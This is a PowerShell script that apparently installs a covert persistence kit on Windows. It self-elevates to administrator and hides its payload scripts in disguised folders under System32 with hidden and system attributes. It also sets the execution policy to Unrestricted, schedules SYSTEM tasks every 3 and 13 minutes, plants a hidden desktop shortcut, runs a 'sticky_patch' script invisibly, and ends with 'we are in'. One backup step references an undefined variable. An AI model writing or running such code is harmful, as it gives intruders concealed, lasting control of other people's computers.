# Self-Elevate to Administrator
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}


#  Define Target Paths
$taskScriptPath    = "$env:windir\System32\Com\en-US"
$logScriptPath     = "$env:windir\System32\Speech\Engines\TTS\en-US"
$oneTimeScriptPath = "$env:windir\security\database\winlogon_color"
$backupPath        = "$env:ProgramData\Microsoft\Windows\SysBackups"

# Ensure Directories Exist
foreach ($dir in @($taskScriptPath, $logScriptPath, $oneTimeScriptPath, $backupPath)) {
    if (-not (Test-Path $dir)) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
        attrib +h +s $dir
    }
}

# Copy and Hide Script Files
$scriptMap = @{}
$scriptMap["$taskScriptPath\sys_usr.ps1"]         = ".\sys_usr.ps1"
$scriptMap["$taskScriptPath\sys_win.ps1"]         = ".\sys_win.ps1"
$scriptMap["$logScriptPath\sys_log.ps1"]          = ".\sys_log.ps1"
$scriptMap["$oneTimeScriptPath\sticky_patch.ps1"] = ".\sticky_patch.ps1"

# Backups: names used by sys_log.ps1 when restoring
$backupMap = @{
    "win_ux.ps1" = ".\sys_usr.ps1"
    "win_ui.ps1" = ".\sys_win.ps1"
}

# Copy runtime files into disguised locations (force overwrite), set hidden+system
foreach ($dest in $scriptMap.Keys) {
    $src = $scriptMap[$dest]
    try {
        Copy-Item -Path $src -Destination $dest -Force -ErrorAction Stop
        try { attrib +h +s $dest } catch { }
    } catch {
        Write-Host "Error copying $src -> $dest : $($_.Exception.Message)"
    }
}

# Copy backup files into ProgramData
foreach ($b in $backupMap.Keys) {
    $src = $backupMap[$b]
    $dst = Join-Path $backupDataPath $b
    try {
        Copy-Item -Path $src -Destination $dst -Force -ErrorAction Stop
        try { attrib +h +s $dst } catch { }
    } catch {
        Write-Host "Error copying backup $src -> $dst : $($_.Exception.Message)"
    }
}

#Set Execution Policy if wasnt set b4
try {
    Set-ExecutionPolicy Unrestricted -Force
} catch {
    Write-Host "Unable to set execution policy globally. Please ensure this is done manually."
}

# Register Scheduled Tasks (clean format)
schtasks /Create /TN "WinUserCheck" /SC MINUTE /MO 3  /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$taskScriptPath\sys_usr.ps1`"" /RU SYSTEM
schtasks /Create /TN "WinTimeToLive" /SC MINUTE /MO 13 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$taskScriptPath\sys_win.ps1`"" /RU SYSTEM

# Create Shortcut for sys_log
$shortcutPath = "$env:Public\Desktop\SystemService.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$logScriptPath\sys_log.ps1`""
$Shortcut.IconLocation = "$env:SystemRoot\System32\shell32.dll,44"
$Shortcut.WindowStyle = 7
$Shortcut.Save()
try { attrib +h $shortcutPath } catch { }


# One-Time Execution: sticky_patch
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$oneTimeScriptPath\sticky_patch.ps1`""


Write-Host "`n we are in, repeat we are in"
